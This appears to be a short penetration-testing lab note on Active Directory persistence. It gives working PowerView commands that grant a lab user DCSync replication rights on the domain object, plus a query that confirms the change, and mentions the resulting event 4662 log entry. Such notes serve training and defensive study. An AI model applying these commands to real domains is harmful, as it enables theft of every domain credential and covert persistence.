# ACL

Adding ACL's to the Domain Object itself

We can also write on the domain object itself and add any ACL for any user with DA privs, but this writing will create logs with 4662 code.

## Pre-reqs:

* Domain Admin Privs

## DC Sync

Using PowerView

Add user replication permission:

{% code overflow="wrap" %}
```powershell
Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity studentx -Rights DCSync -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
```
{% endcode %}

where `PrincipalDomain` is the domain where the user is present and the `targetdomain` is the domain where the Container is present.

Check if worked:

{% code overflow="wrap" %}
```powershell
Get-DomainObjectAcl -SearchBase "DC=dollarcorp,DC=moneycorp,DC=local" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "studentx"} 
```
{% endcode %}
